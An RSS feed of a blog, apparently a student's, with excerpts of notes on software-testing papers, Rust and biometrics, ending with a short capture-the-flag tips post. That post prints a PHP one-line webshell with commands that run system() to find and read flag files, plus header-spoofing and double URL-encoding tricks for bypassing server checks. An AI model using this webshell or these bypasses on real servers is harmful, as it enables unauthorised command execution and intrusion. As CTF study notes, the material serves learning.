<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Hagemon&#39;s Log</title>
    <link>https://hagemon.github.io/posts/</link>
    <description>Recent content in Posts on Hagemon&#39;s Log</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Hagemon Production</copyright>
    <lastBuildDate>Fri, 14 Oct 2022 17:03:56 +0800</lastBuildDate><atom:link href="https://hagemon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ODIN-Detecting Non-crashing Functional Bugs in Android Apps via Deep-State Differential Analysis</title>
      <link>https://hagemon.github.io/posts/odin/</link>
      <pubDate>Fri, 14 Oct 2022 17:03:56 +0800</pubDate>
      
      <guid>https://hagemon.github.io/posts/odin/</guid>
      <description>A note for Detecting Non-crashing Functional Bugs in Android Apps via Deep-State Differential Analysis by Jue Wang from Nanjing University.
Introduction Non-crashing functional bugs are ofen buried in rare program paths, which are difficult to detect but lead to servere consequences.
This paper proposed ODIN, a novel technique to detect non-crashing functional bugs via deep-state differential analysis.
There exists two observations of automatic generated test inputs:
 Only a small portion of tests input would reach an errorneous app state.</description>
    </item>
    
    <item>
      <title>Fastbot2</title>
      <link>https://hagemon.github.io/posts/fastbot2/</link>
      <pubDate>Tue, 27 Sep 2022 22:46:03 +0800</pubDate>
      
      <guid>https://hagemon.github.io/posts/fastbot2/</guid>
      <description>文章《Fastbot2: Reusable Automated Model-based GUI Testing for Android Enhanced by Reinforcement Learning》的笔记，作者是字节跳动的Zhengwei Lv。
Introduction 本文介绍了一种基于强化学习模型的自动GUI测试方法，主要思想是利用已经积累的event-activity转移知识（knowledge of historical event-activity transitions），为之后的事件选择做出合理的决策。该方法所要解决的主要问题是：如何制定事件选择的策略，使得所选择到的事件可以探索到更多的activity，从而能够找到更多潜在的crash。
本文以覆盖更多activity为目标，提出以下两个方法：
 构建全局概率模型，在测试过程中不断更新各事件选择的概率，从而选择能够探索更多页面的事件。 基于N-step SARSA方法，在测试过程中维护Q-table，利用多步信息选择到更合适的事件。  Workflow 本方法主要分为测试前和测试中两个阶段。在测试前，需要安装软件、收集一些静态信息和初始化模型，具体来说：
 对安装包进行反编译，获取静态的组件文本标签； 在所有测试机上安装软件； 利用历史数据初始化概率模型（若无则令模型为空，即所有事件都没有被探索过）。  在测试时，需要利用当前的GUI信息进行事件选择、执行、模型更新、Activity覆盖统计和bug统计等，具体来说：
 获取当前GUI信息； 获取可被执行的事件； 根据策略选择事件，这些事件应该有更大的概率探索到新的activity； 执行事件； 更新概率模型和Q-table（用于做出更好的决策）；  以上五个步骤在一定时间内会重复执行，直到达到运行时限（如测试1小时）。
A Throughout Example 本文使用了头条中4个Activity的转换过程为例，介绍了event选择的策略：
Model Hyper-events 本文将软件中相似的事件抽象为hyper-event，从而平衡模型的可扩展性和准确性。具体来说，在衡量组件的相似情况时只考虑以下4个因素：
 组件所在的Activity； 组件的resource-id； 组件的文本（若是动态获取的文本，则认为它是empty）； 组件支持的事件（如点击和长按）。  若两个组件在这4个因素上相同，则本文认为它们有着相近的功能，并且可以使用同一个hyper-event驱动。
example 举例来说，例图中的Activity 1中，Title 1和Title 2拥有相同的属性，即：
 在同一个activity中； 都具有空文本（动态获取）； 同一个resource-id和同样； 同样的事件类型（点击）。  Probabilistic Model 概率模型表示了在每个hyper-event转化到各Activity的概率。具体来说有如下定义：
 $\mathcal{E}$表示UI组件中获取到的hyper-events集合； $\mathcal{A}$表示待测软件所有的Activity的集合； $\delta$表示转移函数，即各hyper-event转移到各Activity的概率，本文用$e\rightarrow (A,p)$表示事件$e$转移到activity $A$ 的概率为$p$。  本文用$M=(\mathcal{E},\mathcal{A},\delta)$表示模型。其中，事件$e$转化为$A_i$的概率计算方法为：</description>
    </item>
    
    <item>
      <title>Neuron Coverage for Adequacy Testing</title>
      <link>https://hagemon.github.io/posts/neuron-coverage-for-adequacy-testing/</link>
      <pubDate>Sat, 03 Sep 2022 16:09:59 +0800</pubDate>
      
      <guid>https://hagemon.github.io/posts/neuron-coverage-for-adequacy-testing/</guid>
      <description>神经覆盖率的概念首先在DeepXplore的论文《DeepXplore: Automated Whitebox Testing of Deep Learning Systems》中被提及，其核心思想是输入数据中被激活的神经元个数占总神经元个数的比例。Lei Ma在此基础上做出了一些改进，提出DeepGauge和Combinatorial；Xiaoning Du提出了针对基于状态的神经网络（如RNN）的覆盖率准则以及相应的工具DeepCruiser；Zhiyang Zhou考虑了特征之间的连接权重，提出了Contribution Coverage和工具DeepCon。
DeepXplore 深度学习系统被广泛应用在一些安全相关的场景中（如自动驾驶），系统在一些边界情况下（corner cases）的准确性和可预测性是十分重要的。大多深度学习系统依赖于标注的数据，从而在一些边界情况下容易暴露问题，从而引发严重的后果。
于是有以下两个问题需要考虑：
 是否有一个标准，可以衡量输入数据的全面性，从而推断模型是否可以考虑到所发生的各种情况。 如何在不需要大量的带标签数据的情况下，可以找到深度学习系统的错误行为。  为了解决这些问题，作者做出了以下几点尝试：
 提出神经元覆盖率的概念，用于衡量深度学习系统的逻辑覆盖程度。 基于交叉引用的思想，利用多个相同功能的深度学习模型，在没有标注数据的情况下以投票的形式找到可能存在错误行为的模型。 基于深度学习系统的输出的可微性，构建生成测试数据的联合优化方法，通过链式法则对输入数据$x$进行梯度提升更新，可以在最大化神经元覆盖率的同时让模型表现出尽可能多的行为。  神经元覆盖率（Neuron coverage） 测试数据集合在神经网络中激活的神经元个数占总神经元个数的比例，被称为该测试数据集合的神经元覆盖率。其中，一旦某个神经元对于某个输入的激活值大于某个值，则认为该神经元被激活。
假设神经网络的神经元集合为$N={n_1,n_2,\dots}$，测试集集合为$T={x_1,x_2,\dots}$，$out(n,x)$表示神经元$n$在对数据$x$进行运算后的输出结果，$t$为神经元被激活的阈值，则神经元覆盖率可以被表示为：
$$ NCov(T,x)=\frac{|n|\forall x\in T,out(n,x)&amp;gt;t|}{N} $$
梯度 与深度学习系统中优化模型的方式不同，作者固定神经元的参数$\theta$，通过计算神经元输出$y$相对于输入$x$的梯度：
$$ G=\nabla_x f(\theta,x)=\partial y/\partial x $$
优化目标 最大化不同行为 最大化不同行为指的是生成的数据集可以让每一个模型都尽可能地预测出多种结果。假设有$n$个深度神经网络$F_{k\in 1\dots n}:x\rightarrow y$，若输入$x$在所有的深度神经网络中都可以预测出正确的结果，我们的目的就是在修改$x$后让至少一个深度神经网络有不同的分类结果。
令$F_k(x)[c]$表示第$k$个神经网络将$x$分类为$c$的概率，选择任一神经网络$F_j$，则最大化不同行为的优化目标表示为：
$$ obj_1(x)=\sum_{k\ne j}F_k(x)[c]-\lambda_1\cdot F_j(x)[c] $$
即对于类别$c$，在最小化$F_j$对其分类的概率的同时，最大化其余所有神经网络对其的分类概率。
最大化神经元覆盖率 对于那些激活值小于$t$的神经元，希望它们的值可以大于$t$，于是在优化目标中加上：
$$ obj_2(x)=\lambda_2\cdot f_n(x) $$
联合优化目标 将两个优化目标合并，得到联合优化目标：
$$ obj_{joint}(x)=\sum_{k\ne j}F_k(x)[c]-\lambda_1\cdot F_j(x)[c]+\lambda_2\cdot f_n(x) $$</description>
    </item>
    
    <item>
      <title>机器学习测试综述</title>
      <link>https://hagemon.github.io/posts/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%B5%8B%E8%AF%95%E7%BB%BC%E8%BF%B0/</link>
      <pubDate>Mon, 29 Aug 2022 11:37:24 +0800</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%B5%8B%E8%AF%95%E7%BB%BC%E8%BF%B0/</guid>
      <description>论文《Machine Learning Testing: Survey, Landscapes and Horizons》的笔记，作者是Jie M Zhang老师，主要了解近年来对机器学习系统测试方面的研究重点。这篇文章可以作为目录，浏览机器学习测试方面的一些经典文章。
概述 机器学习应用在各个行业扮演着越来越重要的角色。这些应用在自动驾驶、医疗等关乎人身安全的行业中也有着比较广泛的使用场景，这很自然地引起人们对其准确性、鲁棒性、隐私性、效率和公平性等因素的思考，于是越来越多的学者开始针对机器学习系统或应用的测试开展研究。目前比较著名的机器学习测试工具有：
 DeepXplore：深度学习的白盒测试工具 Themis：检测机器学习系统的公平性  实际上，机器学习应用的测试有许多和传统软件测试类似的特性，这些特性在传统软件测试中已经得到充分的研究，但机器学习应用的统计学属性（包含不确定性）给相应的测试工作带来了额外的挑战：
 数据敏感：机器学习系统是一个数据驱动的系统，它的表现会随着新数据的输入、训练而不断变化，然而传统软件并不会因为数据输入而改变它的行为。 Oracle问题：机器学习系统的测试总是缺少期望的输出（如测试集的label）来判断系统是否存在问题。 涌现特性（Emergent Properties）：当系统中的各个组件单独存在时，它们很难发挥作用。只有将它视为一个整体时，在各个组件协同工作的情况下才能有好的效果，这让我们无法通过拆解系统的手段来定位问题，增加了测试的难度。 错误传播：当系统的一个部分出现问题时，它可能会将这个问题扩散到系统的其它部分，从而难以发现问题所在。  本文对机器学习测试问题进行了全面的阐述，主要包括四个角度：
 测试属性（testing properties）：如准确率、鲁棒性、公平性等 测试组件（testing components）：如数据、程序和框架 测试工作流（testing workflow）：如测试用例生成、测试执行和测试评估 应用场景（application scenarios）：如自动驾驶、机器翻译等  另外，本文还统计了各种研究问题的分布情况，并就传统软件测试与机器学习应用测试技术的交叉展开了定位及未来研究方向分析。
机器学习测试介绍 本节对机器学习测试做出定义和分析，介绍测试工作流（how to test）、测试目标（what to test）和测试组件（where to test）的概念。
定义 软件中存在的问题（bug）指的是软件当前的状况和所期待的状况有所偏差，本文对机器学习的bug和机器学习测试做出以下定义：
 ML Bug：指在机器学习应用中，任何使当前状态与期待中状态（required conditions）有所不一致的影响因素（machine learning items）。 ML Testing：指任何找到ML bugs的方法（testing activities）。  定义中包含三个重要的概念：
 required conditions：包括准确率、鲁棒性和隐私性等，在机器学习系统中可能以不同的形式存在，这些是我们测试的目标，本文定义为测试属性（testing properties） machine learning items：包括输入数据、程序和框架，这些是我们测试时可能出现问题的地方，本文定义为测试组件（testing components） testing activities：包括测试用例生成、oracle的鉴定、测试充分性的评估和bug的分类诊断，这些是我们的测试手段，本文定义为测试工作流（testing workflow）  和传统软件测试不同，机器学习系统测试除了要对程序本身进行检查，还需要对输入数据进行检查，这也增加了测试工作的多样性。</description>
    </item>
    
    <item>
      <title>基于自动化功能性模糊测试的安卓软件非崩溃bug检测</title>
      <link>https://hagemon.github.io/posts/%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%9F%E8%83%BD%E6%80%A7%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9A%84%E5%AE%89%E5%8D%93%E8%BD%AF%E4%BB%B6%E9%9D%9E%E5%B4%A9%E6%BA%83bug%E6%A3%80%E6%B5%8B/</link>
      <pubDate>Mon, 08 Aug 2022 21:52:15 +0800</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%9F%E8%83%BD%E6%80%A7%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9A%84%E5%AE%89%E5%8D%93%E8%BD%AF%E4%BB%B6%E9%9D%9E%E5%B4%A9%E6%BA%83bug%E6%A3%80%E6%B5%8B/</guid>
      <description>文章Fully Automated Functional Fuzzing of Android Apps for Detecting Non-Crashing Logic Bugs的笔记，作者是Ting Su老师。
概述 目前的测试工具大多用于检测引起崩溃（crash）的bug，而缺乏一个自动化检测非崩溃性bug（non-crashing bugs）的方法。引发这些非崩溃性bug的主要原因通常是软件的实现逻辑有误，从而导致GUI的显示没有达到预期。
目前要解决非崩溃的功能性问题，主要面临两个挑战：
 需要大量的经验和人力。 缺少test oracles以实现自动化测试。  本文基于蜕变测试（metamorphic testing）的思想，提出了一种独立页面模糊测试（independent view fuzzing）来解决这个问题。其核心思想利用了页面之间的独立性，在随机生成的种子测试用例（seed tests，下文简称seeds）上，额外增加一系列独立的事件，从而构建变种测试用例（mutated tests，下文简称mutants）。对于mutants来说，其表现应该与seeds具有一致性，蜕变测试方法通过检验这种一次性来判断软件是否有功能性问题。
所谓页面独立性，指的是对于同一个父组件上平行的组件（如ListView中并排的按钮），或不属于同一个父组件的组件（如ListView的按钮和导航栏的按钮）在功能上应该相互独立。对于其中一个组件的操作不会影响其它组件的正常功能。本文称其为独立页面属性（Independent View Properties）。
给予独立性的概念，mutants和seeds的执行情况应该要保持一致，否则就认定为出现了功能性问题。
本文构建了自动化功能模糊测试工具GENIE，在给定一个软件后，GINIE可以做到：
 在不需要人为设计测试用例的情况下，自动检测非崩溃bug。 检测到的bug具有多样性和通用性，在多个功能属性上皆有效果。  独立页面属性 举例来说明独立页面属性：ActivityDiary应用可以记录每日生活中的照片，这些照片可以被分为多个类别（电影、睡觉、做清洁等）。用户在选择一个类别后，可以上传照片并发布到Diary页。在Dairy页面中，可以对已发布的照片执行删除操作。具体场景如下图描述：
初始状态为$l_1$，用户按照以下的流程（记为流程A）操作进行状态转移：
 点击Cinema按钮，新增一个Cinema主题的日记，状态转移到$l_2$。 点击相机按钮，选择一张图片后，图片加载到页面上，状态转移至$l_3$。 点击导航栏，返回日记页面，页面显示Cinema标题和图片内容，状态转移至$l_4$。 点击图片，弹出删除对话框，状态转移至$l_5$。 点击确认删除，页面上图片被删除，仅保留Cinema标题，状态转移至$l_6$，流程终止。  从直觉来说，若在删除Cinema的图片之前添加一个Sleeping或Cleaning的日记，对Cinema图片的删除流程是不会有影响的，这里就体现了页面之间的独立关系。将上述流程作为seeds，我们可以生成一个mutants：
该流程（记为流程B）表示为：
 在$l_3$时，点击Cleaning按钮，新增一个Cleaning主题的日记，状态转移至$u_1$。 点击相机按钮，选择一张图片，图片加载到页面上，状态转移至$u_2$。 点击导航栏，返回日记页面，页面显示Cleaning和Cinema标题和对应的图片内容，状态转移至$l_4&amp;rsquo;$。 点击Cinema对应的图片，弹出删除对话框，状态转移至$l_5&amp;rsquo;$。 确认删除，此时可能会出现两种情况：  Cinema图片被成功删除，仅保留Cleaning日记及Cinema标题，状态转移至$l_6&amp;rsquo;$，流程结束。 Cleaning图片被删除，页面保留Cinema日记内容及Cleaning的标题，状态转移至$u_6$，此时页面间的独立性被破坏，检测到功能问题。    总结来说，正常情况下，在相对一个流程（如流程A）新增一些操作后（如流程B中新建Cleaning日记），原有流程的后续操作（如删除Cinema图片）是不会影响其它组件的（如Cleaning的图片不会被删除）。否则就出现了功能性问题（如Cleaning的图片反而被删除）。
在本例中，独立页面属性体现在：“额外增加一个Cleaning的日记后，对删除Cinema的图片不会造成影响”。这种独立页面属性是广泛存在于安卓软件中的：本文调查了5个有名的、不同类别的且拥有百万下载量的安卓软件，从他们的bug reports中找到129的非崩溃bug，其中有38个（29.5%）体现了独立页面属性，所以该项研究对寻找到这些大量存在的问题是有一定帮助的。
针对以上流程，可以引出了几个关键问题：
 我们如何去生成这些seeds？ 我们如何生成mutants，以至于可以让额外的事件序列可以体现出页面独立属性？ 我们如何去衡量mutants的操作结果和seeds的操作结果存在不一致，即mutants是否影响了正常的  问题和主要思路（独立页面属性模糊测试） 为解决上述的问题，本文的主要步骤包括：</description>
    </item>
    
    <item>
      <title>Multi Level GUI Comparison Criteria</title>
      <link>https://hagemon.github.io/posts/multi-level-gui-comparison-criteria/</link>
      <pubDate>Sun, 07 Aug 2022 22:12:43 +0800</pubDate>
      
      <guid>https://hagemon.github.io/posts/multi-level-gui-comparison-criteria/</guid>
      <description>Modern Android apps contain a number of dynamically constructed GUIs, which make accurate behavoir modeling more challenging. Baek and Bae proposed a set of multi-level GUI Comparison Criteria(GUICC) ,which provides multiple abstraction levels for GUI model generation.
A GUI model is a event-driven transitions beteen GUI states, naturally described in a graph formulation. We call a GUI modal as a “GUI graph”.
Definition. A GUI graph $G$ is a directed graph that consist of distinct GUI states as “ScreenNodes” ($S$ for short), which distinuished by a specific GUI comparison criterion.</description>
    </item>
    
    <item>
      <title>基于真实bug的GUI自动化测试标准设计</title>
      <link>https://hagemon.github.io/posts/%E5%9F%BA%E4%BA%8E%E7%9C%9F%E5%AE%9Ebug%E7%9A%84gui%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E8%AE%BE%E8%AE%A1/</link>
      <pubDate>Fri, 05 Aug 2022 22:12:50 +0800</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E5%9F%BA%E4%BA%8E%E7%9C%9F%E5%AE%9Ebug%E7%9A%84gui%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E8%AE%BE%E8%AE%A1/</guid>
      <description>论文Benchmarking Automated GUI Testing for Android against Real-World Bugs的学习笔记，作者是Ting Su老师。
总览 在自动化GUI软件测试中，有一个关键问题：“测试工具如何有效地、全面地找到实际存在的crash bug（How effectively and thoroughly can these tools find crash bugs in practice?)”。本文的主要围绕这个问题展开工作，制定了一个名为THEMIS的标准来比较自动化GUI测试工具的有效性。
目前的研究主要聚焦于使用不同的测试工具，对多个app进行测试，比较它们找到crash bug的个数和被测代码的覆盖率。这些方法都是基于软件和测试工具，来对未知的crash bug进行检测，这种检测方法提供的信息很有限，无法很好地解释上述的关键问题。
本文的核心思想在于：构建包含真实bug（ground-truth）的数据集，并检验测试工具能否在app上检测出这些bug。
这种做法有以下的好处：
 可以更直接、更深入地分析测试工具的有效性。基于未被检测到的真实bug，分析各工具的短板，并可以进一步地总结所有工具存普遍存在的问题，帮助测试工具更好地发展。 增加测试工具的可靠性，分析测试工具在“bug去重”时是否存在策略上的缺陷，使得两个不同的真实bug被判定为相同，从而让结果变得不可靠。  为了达到这个目的，本文基于多个专家的经验，从1,829个开源安卓软件中人为选择了20个开源项目的52个真实bug。这些bug都被标注了“高优先级”等字样，并且影响了软件的主要功能，或是影响的用户范围较广，表明了这些bug的重要程度。
基于真实bug数据集，本文提出了3个研究问题：
 RQ1:现有的测试工具是否能够有效、全面地检测到真实的bug。 RQ2:现有的测试工具是否存在共同的短板，使得它们无法发现一些特定的bug。 RQ3:有哪些因素制约了测试工具对真实bug 的检测，如何针对这些因素对测试工具进行改进。  测试工具 为了研究这些研究问题，本文选择了8个流行的测试工具：
  Monkey：能够随机生成GUI事件（touch、gesture、random texts）和系统事件（volume controls、navigation）。
  APE：结合随机策略和深度优先搜索策略生成GUI事件序列，同时基于决策树算法，在运行时对生成模型进行不断优化。
  HUMANOID：基于深度学习，利用神经网络来预测当前GUI状态下，最合适的GUI事件。
  COMBODROID：利用一系列简短、独立的测试用例，通过分析它们的数据流向和GUI过度关系，结合成为若干个较长的GUI事件。
  TimeMachine：将GUI的布局定义为状态（state）
 若在测试过程中发现一个较好的状态（如调用了之前没有调用过的函数），则认为该状态是一个interesting state，并将其记录。 若当前的状态没什么进展，则将状态恢复到最近的一个较好的状态，并继续开展测试。    Q-TESTING：基于强化学习的思想
 当某个GUI状态与上一个相似时，获得较小的reward 当某个GUI状态与上一个差别较大时，获得较大的reward  从而生成较具代表性的GUI事件序列</description>
    </item>
    
    <item>
      <title>理解和检测安卓应用中系统设置相关的缺陷</title>
      <link>https://hagemon.github.io/posts/%E7%90%86%E8%A7%A3%E5%92%8C%E6%A3%80%E6%B5%8B%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E4%B8%AD%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE%E7%9B%B8%E5%85%B3%E7%9A%84%E7%BC%BA%E9%99%B7/</link>
      <pubDate>Wed, 03 Aug 2022 20:46:25 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E7%90%86%E8%A7%A3%E5%92%8C%E6%A3%80%E6%B5%8B%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E4%B8%AD%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE%E7%9B%B8%E5%85%B3%E7%9A%84%E7%BC%BA%E9%99%B7/</guid>
      <description>本文是论文Understanding and Finding System Setting-Related Defects in Android Apps的总结笔记，作者是Jingling Sun。
总览 安卓系统提供了很多用户可以更改的系统配置，比如网络连接、飞行模式、静音、系统语言等。这些系统配置的变更，可能会影响到app的表现形式。但如果app对这些变更处理不当，可能使app存在缺陷（简称为设置缺陷）。这些缺陷可能引发UI错误、功能失效甚至是崩溃，从而影响用户体验。而目前的软件测试方法并不能系统地找到这些设置缺陷。
本文主要从两个方面研究设置缺陷：一方面，本文收集了180个开源安卓app的1074个设置缺陷，并探究它们的影响（impact）、根本原因（root causes）和后果（consequence）。另一方面，构建了一个端到端的测试工具（SetDroid）对26个流行的开源项目进行测试，并找到了42个设置缺陷（33个被确认，21个被修复）。同时，对5个流行的工业软件开展测试，找到了17个设置缺陷（全部被确认和修复）。
本文的核心思想是，所有的软件应该针对系统设置的变化，自动地做出相应的改变，并且：
 系统设置还原后，能够恢复到原来的状态。 在不还原的情况下，能够体现出不同设置下的差异。  以实际的app为例，来解释设置缺陷是如何引发错误的：
  Wordpress
 当用户在发表一篇博客时开启飞行模式，则发送的操作会一直保持在等待状态，即使飞行模式已经被关闭且网络恢复了。 在飞行模式下发送草稿后，app将会在下一次开启时崩溃。    NextCloud
在用户开启了系统的省电模式后，它的自动上传功能会变得无法使用，即使用户已经把app加入了省电模式的白名单。
  目前的方法中，大多没有系统地研究这些缺陷，而是专注于某些特定的系统设置（如权限、屏幕方向）。另外，一些SOTA的通用测试技术只在app内部做测试，很少考虑到系统设置的影响；或是只研究引发程序崩溃的缺陷，而没有探测那些不会引发崩溃的缺陷（non-crash defects）。所以本文的工作亮点为：
 针对大部分的系统设置进行研究 考虑系统设置对app的影响 不仅检测引发崩溃的缺陷，还检测不会引发崩溃的缺陷  为了达到这些目的，本文主要针对三个研究问题进行探究和分析：
 RQ1（impact）：设置缺陷是否会广泛影响app的使用？ RQ2（root cause）：引起这些缺陷的主要原因有哪些？ RQ3（consequences）：这些缺陷主要引发什么后果？这些后果是以什么形式展示的？  经验研究方法 收集和总结设置类别 本文根据安卓文档和主流的安卓系统，总结了9个主要的设置类别，并使用一些常见的关键词来描述它们。这些关键词从一些bug报告和安卓SDK API中提炼而来，具体关键词如表所示：
   Setting Categories Keywords Description     Network and connect Bluetooth, WLAN, NFC, internet, network, hot-spot, mobile, wifi, airplane 管理设备的网络模式（Wi-Fi、移动数据或飞行模式）或是和别的设备的连接（蓝牙）   Location and security location, device only, phone only, GPS, high accuracy, screen lock, fingerprint 管理设备的安全设置（如何解锁）、定位及对应的三种定位方式（使用网络和GPS、只使用网络、只是用GPS）   Sound vibrate, ringtone, do not disturb, silent 管理设备的声音（如禁音状态）   Battery power save, battery 管理省电模式，或为各app加入省电模式白名单   Display orientation, vertical, horizontal, split screen, Multi-window, screen resolution, brightness, landscape, portrait, rotate 管理设备的显示，如亮度、字体和屏幕方向   Apps and notifications permission, disable, notification 管理运行时的权限、以及app是否能够给用户发送通知   Developer developer option, keep activity 模拟特定环境的告诫设置，如强制right to left布局方向   Accessibility accessibility, talkback, text-to-speech, color correction, color inversion, high contrast text 辅助功能，如调整对比度、打开屏幕阅读器   Other settings setting, preference, date, time, time zone, hour format, date&amp;amp;time, reading mode, car mode, one-handed mode, dark mode, game mode, night mode, theme, language 改变语言、系统时间、输入方式、系统时间格式、主题等    收集设置缺陷的bug reports 收集设置缺陷的bug reports分为三个阶段：</description>
    </item>
    
    <item>
      <title>Rust note</title>
      <link>https://hagemon.github.io/posts/rust-note/</link>
      <pubDate>Sun, 17 Oct 2021 15:26:57 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/rust-note/</guid>
      <description>内存管理 Rust中没有垃圾回收机制，通过所有权和借用来保证数据的内存安全。
所有权(Ownership) 所有权系统在编译时会检查一组规则，当满足这些规则时才会通过编译，同时能保证程序运行的速度。
作用域界定规则 Rust中作用域用大括号{}表示，无论是if、else还是match，或是直接的{}都表示一个作用域。
// `mascot` is not valid and cannot be used here, because it&amp;#39;s not yet declared. {  let mascot = String::from(&amp;#34;ferris&amp;#34;); // `mascot` is valid from this point forward.  // do stuff with `mascot`. } // this scope is now over, so `mascot` is no longer valid and cannot be used. println!(&amp;#34;{}&amp;#34;, mascot); // this will cause an error. error[E0425]: cannot find value `mascot` in this scope --&amp;gt; src/main.</description>
    </item>
    
    <item>
      <title>Multimodal Biometric Feature Learning Notes</title>
      <link>https://hagemon.github.io/posts/multimodal-biometric-feature-learning-notes/</link>
      <pubDate>Thu, 10 Jun 2021 18:51:25 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/multimodal-biometric-feature-learning-notes/</guid>
      <description>生物识别可以安全快速地鉴别个体，具体可以通过指关节纹（Finger Knuckle Print，FKP）、指纹（Finger Print)、掌纹（Palm Print）等。由于疫情影响，FKP识别成为一个不易传播疾病的识别方式。
LEARNING DISCRIMINATIVE FINGER-KNUCKLE-PRINT DESCRIPTOR （ICASSP 2019）方向信息(Direction information)是识别FKP图像的一个关键特征，大多现有的方法仍然使用这人工设计的特征，这些特征需要很多的先验知识。这篇文章为FKP的特征学习，提出了一种基于方向的二值特征学习方法(Discriminative Direction Binary Feature Learning, DDBFL)。主要贡献有：
 设计了一种基于Gabor过滤器卷积的特征Direction Convolution Difference Vector(DCDV) 使用投影函数将特征二值化，并保持同类样本的紧密性(compact)和异类样本的差异性(separable) 将特征进行分块统计，组成最终的FKP特征算子(Feature Descriptor)  Gabor Filter Gabor滤波器使用了图像频域中的信息来提取图像的纹理特征，由一个二维高斯函数和二维三角函数叠加而成，本文使用了Gabor滤波器的实数部分
$$ G(x,y,\theta,\sigma, \beta)=\frac{1}{2\pi \sigma\beta}\exp{-\pi(\frac{x&amp;rsquo;^2}{\sigma^2}+\frac{y&amp;rsquo;^2}{\beta^2})}\cos({2\pi \mu x&amp;rsquo;}) $$
其中
$$ \begin{aligned} x&amp;rsquo;=(x-x_0)\cos\theta+(y-y_0)\sin\theta \\ y&amp;rsquo;=-(x-x_0)\sin \theta + (y-y_0)\cos \theta \end{aligned} $$
$(x_0,y_0)$为核的中心，$\mu$是径向频率（我取1/3），$\sigma$和$\beta$为$x,y$标准差，这里取1。
DCDV 在本文中，当选定了一个方向$\theta$后，根据核的大小便可以计算出每个方向的Gabor核，并在图像上进行卷积操作，得到每一个像素在该方向的特征值。本文从$[0,\pi]$选择了12个方向，为每个像素计算了12个特征值，将12个特征值$c_1,c_2,\dots,c_{12}$的相邻差组成向量，即DCDV： $$DCDV=[c_{12}-c_{11},c_{11}-c_{10},\dots,c_2-c_1,c_1-c_{12}]$$ DCDV可以很好的表示图像中出现的多个主要方向特征，若相邻的两个卷积结果异号，说明此处包含着方向信息。同时，DCVC的均值为零，所以不需要做归一化。
DDBFL 特征的二值表示是一个具有鲁棒性的表示方法，若原始特征值具有一定动荡性，它的二值表示还是能相对稳定一些的，如$[0.8,0.9]$的动荡，在二值表示后还是会归为$1$。本文使用一个投影矩阵$W\in R^{k\times d}$将$d$维的DCVC投影至$k$维的DDBFL，具体计算如下： $$b_{p,i,k}=\frac{1}{2}(sgn(w_k^T x_{p,i})+1)$$ 表示第i个样本第p个像素的第k维二值特征。
Objective 优化目标主要从两个角度：
 增加特征的差异性，使特征之间长得不一样，更具辨识度，即特征的方差最大化。 使同类样本接近，异类样本远离 于是可以将优化目标初步表示为：  $$ \begin{aligned} \max_{w_k}J(w_k)&amp;amp;=\max_{w_k}J_1(w_k)+2\lambda J_2(w_k) \\ &amp;amp;=\max_{w_k}\sum_{p=1}^P \sum_{i=1}^N ||b_{p,i,k}-\mu_{p,k}||^2 \\ &amp;amp;+2\lambda\sum_{p=1}^P\sum_{i=1}^N (\sum_{j\in \Gamma(i)}||b_{p,i,k}-b_{p,j,k}||^2 -\sum_{j\notin \Gamma(i)}||b_{p,i,k}-b_{p,j,k}||^2 ) \end{aligned} $$</description>
    </item>
    
    <item>
      <title>网络攻防tips</title>
      <link>https://hagemon.github.io/posts/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2tips/</link>
      <pubDate>Thu, 10 Jun 2021 16:50:16 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2tips/</guid>
      <description>记录一些网络攻防题中的小tips。
Robots 每个网站有一个robots.txt用于防爬虫。
BP构造POST请求 在BP中可以在header里添加Content-type: application/x-www-form-urlencoded，并在最后添加参数构造POST请求
伪造请求 在header中添加x-forwarded-for: xxx.xxx.xxx.xxx，以及referer: https://www.google.com 来伪造请求。
一句话木马 当一句话木马在服务器上时：
&amp;lt;?php @eval($_POST[&amp;#39;shell&amp;#39;]);?&amp;gt;将请求构造为POST，且将参数设置为
shell=system(&amp;#34;find / -name &amp;#39;flag*&amp;#39;&amp;#34;); shell=system(&amp;#39;cat flag.txt&amp;#39;); ?的解码 问号的URL编码为%3f，浏览器会将%3f解码为问号。如果服务端对问号有一次解码校验的过程：
&amp;lt;?php url_decode($param); ?&amp;gt;则可以先将%3f编码，即%253f。浏览器会现将%253f解码为%3f，这样就可以绕过服务端的问号校验（服务端收到的就是%3f而不是？）。
PHP中的比较 PHP中==会先强制转化类型再比较值，而===则会比较类型和值。
&amp;lt;?php $a = &amp;#39;a1234&amp;#39;; $a == 1234; # 在比较时会去掉字母 $b = &amp;#39;abc&amp;#39;; $b == 0; # 比较时会去掉字母 &amp;gt; phps phps是php的source文件，当找不到php在干嘛的时候可以看一下
浏览器解码 浏览器会对URL进行一次urldecode，当源码会检验URL时，我们可以通过先对参数进行适当次数的urlencode后传参。
